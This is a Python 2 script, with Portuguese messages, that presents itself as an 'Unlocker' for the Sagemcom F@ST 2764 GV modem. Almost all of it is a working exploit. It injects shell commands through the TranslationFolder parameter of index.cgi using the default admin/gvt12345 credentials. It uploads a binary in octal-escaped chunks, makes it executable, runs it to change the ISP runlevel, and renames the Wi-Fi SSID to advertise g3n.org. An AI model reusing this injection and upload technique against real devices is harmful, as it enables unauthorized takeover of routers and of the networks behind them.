#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#
# Copyright (C) 2014  Triple Oxygen <oxy@g3n.org>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#

import urllib
import urllib2
import base64
import sys 
import signal

def signal_handler(signal, frame):
    print("[-] Finalizando.")
    sys.exit(0)

def generate_bs(host, auth):
    cmd = "echo $(grep linesArray /home/httpd/html/Common.js | grep split | tr -d \"a-zA-Z =.();'\") | dd bs=1 count=1 > /tmp/bs"
    ret = send_command(host, auth, cmd)
    #print ret
    ret = send_command(host, auth, "cat /tmp/bs")
    
    try:
        if(ret.strip() == "\\"):
            return
    except:
        print "[-] Falha ao extrair nosso caracter mágico. Reinicie o modem e tente novamente."
        sys.exit(-1)

def send_file(host, auth, name):
    prefix = "A=`cat /tmp/bs`;echo "
    bsz = 12

    try:
        f = open(name, "rb")

        buf = f.read(bsz)
        read = len(buf)

        while (read > 0):
            cmd = prefix
            cmd += ''.join([ "\"$A\"0%o" % (ord(x)) for x in buf ])
            cmd += " | dd bs=1 count=%d >> /tmp/b" % (read) 
            #print cmd   

            ret = send_command(host, auth, cmd)

            if(ret.strip() != "EMPTY GetListOfFiles"):
                raise IOError("Erro inesperado no modem")                
    
            buf = f.read(bsz)
            read = len(buf)
        
        f.close()

    except:
        print "[-] Falha ao enviar payload."
        print "[-] Certifique que o Unlocker foi extraido corretamente e o 'rg_conf_set' esteja no mesmo diretório dele. Então, reinicie o modem e tente novamente."
        sys.exit(-1)
    
def send_command(host, auth, cmd):
    url = "http://%s/index.cgi?script=cms_cgi&action=GetListOfFiles&TranslationFolder=x;%s" % (host, urllib.quote_plus(cmd)) # ;)
    req = urllib2.Request(url)
    req.add_header("Authorization", "Basic " + auth)

    try:
	result = urllib2.urlopen(req)
	return result.read()
    except:
	print "[-] Erro ao enviar comando."
	
def send_config(host, auth, rlevel):
	send_command(host, auth, "chmod +x /tmp/b")
	send_command(host, auth, "exec /tmp/b dev/ath0/wl_ap/wl_ssid \"Desbloqueio gratuito - g3n.org\" 1> /dev/null")
	send_command(host, auth, "exec /tmp/b Gvt/runlevel %d 1> /dev/null" % rlevel)
	
	return

def main():

    signal.signal(signal.SIGINT, signal_handler)

    print ""
    print "Sagemcom F@ST 2764 GV Unlocker v2"
    print "Copyright (C) 2014  Triple Oxygen <oxy@g3n.org>"
    print ""
    print "Software gratuito. Se pagou por ele, exija seu dinheiro de volta."
    print ""
    print "Caso não funcione na primeira vez, reinicie o modem e tente novamente. Testado no v8460."
    print ""
           
    host = raw_input("IP do modem [deixe em branco para '192.168.25.1']: ")
    if(host is ''):
        host = "192.168.25.1"
        
    username = raw_input("Usuário [deixe em branco para 'admin']: ")
    if(username is ''):
        username = "admin"

    password = raw_input("Senha [deixe em branco para 'gvt12345']: ")
    if(password is ''):
        password = "gvt12345"

    rl = raw_input("RunLevel [deixe em branco para '4']: ")
    if(rl is ''):
        rl = "4"
        
    print ""

    try:
        rlevel = int(rl)
    except ValueError:
        print "[-] RunLevel deve ser um número."
        sys.exit(-1)

    if(rlevel > 0 and rlevel <= 4):

        print "[+] Alterando runlevel para %d em %s:%s@%s" % (rlevel, username, password, host)

        auth = base64.encodestring(b"%s:%s" % (username, password))[:-1]

        print "[+] Conseguindo nosso caracter mágico ..."
        generate_bs(host, auth)

        print "[+] Enviando payload (aguarde cerca de 1 minuto) ..."
        send_file(host, auth, "rg_conf_set")

        print "[+] Configurando o modem ..."
        print "[+] O modem pode reiniciar sozinho neste passo. Caso tenha reiniciado ou este passo demorar mais que 20 segundos, feche este programa."
        send_config(host, auth, rlevel)

        print "[+] Pronto. Caso o modem não tenha reiniciado, faça manualmente agora."

    else:
        print "[-] RunLevel deve estar entre 1 e 4, inclusive."
	
    return

if __name__ == '__main__':
	main()

